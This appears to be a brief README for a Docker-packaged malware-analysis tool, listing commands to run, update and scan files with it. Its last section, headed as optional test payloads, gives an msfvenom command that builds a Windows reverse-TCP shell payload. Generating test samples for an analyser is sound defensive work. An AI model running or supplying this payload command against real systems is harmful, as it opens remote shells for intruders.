<H3>ALL IN ONE MALWARE ANALYSIS (STATIC AND DYNAMIC)</H3>
tuts: https://youtu.be/5Z4QXIDQVyE?si=UXykY_vxrarTooxw&t=646

**RUN**
`docker run -it --rm -v ~/www/:/data quickscope:latest

**HELP**
`docker run -it --rm -v ~/www/:/data quickscope:latest -h`

**UPDATE**
`docker run -it --rm -v ~/www/:/data quickscope:latest --db_update`

**SCAN**
`docker run -it --rm -v ~/www/:/data quickscope:latest --file <file/to/scan.exe> --analyze`

---

**NOTE**
IF YOU ADDED SOME MODIFICATIONS, 
YOU HAVE TO REBUILD THE CONTAINER BEFORE USING IT
`sudo docker build -t qu1cksc0pe .`

---
**TEST PAYLOADS (OPTIONAL)**

basic windows (bin)
`msfvenom -p windows/x64/shell/reverse_tcp lhost=wlan lport=9443 -f raw -o basic.bin`

